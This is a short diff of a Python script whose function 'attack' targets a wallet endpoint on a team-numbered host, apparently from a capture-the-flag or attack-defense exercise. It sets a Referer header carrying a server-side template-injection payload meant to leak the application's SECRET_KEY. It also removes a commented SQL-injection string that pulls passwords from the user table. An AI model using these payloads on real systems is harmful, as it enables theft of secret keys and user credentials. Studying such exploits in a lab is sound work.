@@ -1,7 +1,6 @@
 import requests
 
 def attack(session):
-    # ex'; SELECT password FROM auth_user where username = 'AwesomeUsername
     url = 'https://www.team0.screecher.de/cash/wallet'
     referer = "'/>This is secret: {{settings.SECRET_KEY}}<a href='"
     session.headers.update({'referer':referer})
